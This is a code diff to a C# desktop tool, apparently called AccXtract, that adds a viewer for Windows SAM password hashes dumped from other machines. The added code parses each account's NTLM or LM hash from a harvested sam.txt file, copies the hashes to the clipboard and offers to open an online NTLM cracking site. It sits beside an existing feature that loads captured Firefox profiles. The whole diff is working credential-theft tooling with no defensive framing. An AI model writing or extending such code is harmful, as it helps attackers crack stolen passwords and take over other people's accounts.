@@ -322,6 +322,87 @@ Path=Profiles/AccXtract." + profileName);
             else MessageBox.Show("Please close Firefox and try again");
         }
 
+        private void viewHash(object sender, EventArgs e)
+        {
+            Button button = (Button) sender;
+
+            //load all the hashes
+            if (button.Text == "All")
+            {
+                StreamReader reader = new StreamReader(AccXtractFolder + "\\" + Environment.MachineName + "\\Windows\\sam.txt");
+                string line = reader.ReadLine();
+                string hashes = "";
+                string info = "";
+                while (line != null)
+                {
+                    string[] profile = line.Split(':');
+                    info += profile[0] + ":";
+                    if (!(profile[2].Contains("NO PASSWORD")))
+                    {
+                        info += profile[2] + "\n";
+                        hashes += profile[2] + "\n";
+                    }
+
+                    else
+                    {
+                        string pass = profile[3].Replace('*', ' ');
+                        info += pass + "\n";
+                        hashes += pass + "\n";
+                    }
+
+                    line = reader.ReadLine();
+                }
+
+                Clipboard.SetText(hashes);
+
+                info += "\n Open cracking site?";
+
+                MessageBoxButtons buttons = MessageBoxButtons.YesNo;
+                if (MessageBox.Show(info, "Hashes copied", buttons) == System.Windows.Forms.DialogResult.Yes)
+                {
+                    Process.Start(@"http://www.md5decrypter.co.uk/ntlm-decrypt.aspx");
+                }
+            }
+
+            //load only one hash
+            else
+            {
+                StreamReader reader = new StreamReader(AccXtractFolder + "\\" + Environment.MachineName + "\\Windows\\sam.txt");
+                string line = reader.ReadLine();
+                string hash = "";
+                while (line != null)
+                {
+                    string[] profile = line.Split(':');
+
+                    if (profile[0] == button.Text)
+                    {
+
+                        if (!(profile[2].Contains("NO PASSWORD")))
+                        {
+                            hash = profile[2];
+                        }
+
+                        else
+                        {
+                            hash = profile[3];
+                        }
+
+                        break;
+                    }
+
+                    line = reader.ReadLine();
+                }
+
+                Clipboard.SetText(hash);
+
+                MessageBoxButtons buttons = MessageBoxButtons.YesNo;
+                if (MessageBox.Show(button.Text + ":" + hash + "\n\n Open cracking site?", "Hashes copied", buttons) == System.Windows.Forms.DialogResult.Yes)
+                {
+                    Process.Start(@"http://www.md5decrypter.co.uk/ntlm-decrypt.aspx");
+                }
+            }
+        }
+
         #region UI Functions
         private GroupBox addNewComputer(string path)
         {
@@ -370,6 +451,23 @@ Path=Profiles/AccXtract." + profileName);
                     string profileName = components2[components2.Length - 1];
                     Button newButton = addButtonToPanel(profileName, lastPanel);
                     newButton.Click += addFirefoxProfile;
+                }
+            }
+            #endregion
+
+            #region SAM
+            if (Directory.Exists(path + "\\Windows"))
+            {
+                lastPanel = addPanel(@"SAM Hashes (Click to copy hash)", lastPanel, newGroup);
+                StreamReader reader = new StreamReader(path + "\\Windows\\sam.txt");
+                string line = "All";
+                while (line != null)
+                {
+                    string[] profile = line.Split(':');
+                    Button newButton = addButtonToPanel(profile[0], lastPanel);
+                    newButton.Click += viewHash;
+
+                    line = reader.ReadLine();
                 }
             }
             #endregion
